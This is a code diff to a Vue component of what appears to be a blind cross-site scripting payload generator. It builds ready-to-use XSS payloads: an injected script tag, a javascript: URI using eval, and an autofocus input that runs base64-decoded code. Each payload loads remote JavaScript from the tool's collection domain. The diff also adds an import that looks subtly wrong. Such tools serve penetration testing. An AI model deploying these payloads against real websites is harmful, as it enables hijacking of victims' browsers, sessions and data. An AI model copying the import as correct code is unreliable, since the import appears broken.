@@ -25,6 +25,7 @@
 import config from '@/config';
 import Vue from "vue";
 import api_request from '@/libs/api.js';
+import get_xss_uri from '@/libs/api.js';
 import router from "@/router/index";
 import utils from '@/libs/utils';
 const html_encode = utils.html_encode;
@@ -85,10 +86,10 @@ export default {
             return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '";document.body.appendChild(a);';
         },
         basic_script: function() {
-            return "\"><script src=\"https://" + this.base_domain + "\"><\/script>";
+            return "\"><script src=\"//" + this.base_domain + "\"><\/script>";
         },
         javascript_uri: function() {
-            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://" + this.base_domain + "\\';document.body.appendChild(a)')";
+            return "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'//" + this.base_domain + "\\';document.body.appendChild(a)')";
         },
         input_onfocus: function() {
             return "\"><input onfocus=eval(atob(this.id)) id=" + html_encode(urlsafe_base64_encode(this.js_attrib())) + " autofocus>";
@@ -116,7 +117,7 @@ export default {
         window.app = this;
 
         // Base domain
-        this.base_domain = api_request.BASE_DOMAIN;
+        this.base_domain = await get_xss_uri();
     },
     beforeDestroy() {}
 };
